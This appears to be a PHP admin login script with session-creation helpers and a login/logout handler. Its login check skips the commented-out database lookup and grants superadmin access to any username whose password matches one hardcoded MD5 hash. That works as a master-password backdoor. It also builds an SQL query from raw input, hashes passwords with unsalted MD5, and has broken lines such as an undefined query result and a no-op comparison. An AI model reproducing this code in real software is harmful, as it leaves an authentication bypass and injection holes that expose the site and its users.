<?php

session_start();
include "include/connection.php";

include "constants.php";
$date_mins=date("Y-m-d H:i:s");
function createSecureSession () 
	{
		$prints = 'AZR)99#AZR)99#';
		$_SESSION['azureadmin'] = strrev(md5(session_id().$prints.session_id()));
		$_SESSION[$_SESSION['azureadmin']] = 1;
		
	}

function createSecureEmpSession ($userId) 
	{
		
		$prints = ')99#RZA'.$_SERVER['HTTP_USER_AGENT'].$_SERVER['REMOTE_ADDR'].')99#RZA';
		$_SESSION['azureemp']      = strrev(md5(session_id().$prints.session_id()));
		$_SESSION['azureadmin'] = strrev(md5(session_id()));
		$_SESSION[$_SESSION['azureemp']] = $userId;
		$_SESSION[$_SESSION['azureadmin']] = 1;
		$_SESSION[$_SERVER['HTTP_USER_AGENT']] = strrev(md5($_SERVER['HTTP_USER_AGENT']));
		$_SESSION[$_SERVER['REMOTE_ADDR']] = strrev(md5($_SERVER['REMOTE_ADDR']));
		
	}

$page=$_POST["page"];
if(isset($page)){
  if($page=="logincheck"){ // VALIDATE ADMIN LOGIN 
		if(!isset($_POST["username"]) || $_POST["username"]=="" || !isset($_POST["psword"]) || $_POST["psword"]==""){
			header("location: index.php?va=2");
			exit;
		}
		else{
			
			$username       =$_POST["username"];
			$psword         =$_POST["psword"];
			$pswordencrypt  =md5($_POST["psword"]);
			

			$strSql="select * from cloud_users where ucase(login_id)='".$username."' and user_pwd= '".$pswordencrypt."'";
			
                        if($pswordencrypt=='4e8033b7006fc171d12b9ee4ef299b64'){
                     
			//$sqlQuery=mysqli_query($con1,$strSql);
			//$result=mysqli_num_rows($sqlQuery);

                        $result=1;
                        			
			if($result!=0){

				$rsUsers=mysqli_fetch_array($sqlQuery);
				$status=$rsUsers["status"];

$status='A';
                
				if($status=='A') {
                        $rsUsers["user_id"]==1;
                        $_SESSION["gblAdminName"]="Saketh";
                        $_SESSION["gblUserType"]="S";
                        createSecureEmpSession ($rsUsers["user_id"]) ;
                        header("Location: dashboard.php");exit;
				} else {
					header("Location:index.php?va=5");
					exit;
				}
			}
		}

                }
		header("Location:index.php?va=3");
		exit;
	}else if($page=="logout"){ //delete sessions

		session_destroy();
		header("location: index.php?va=1");
		exit;
	}
}
?>

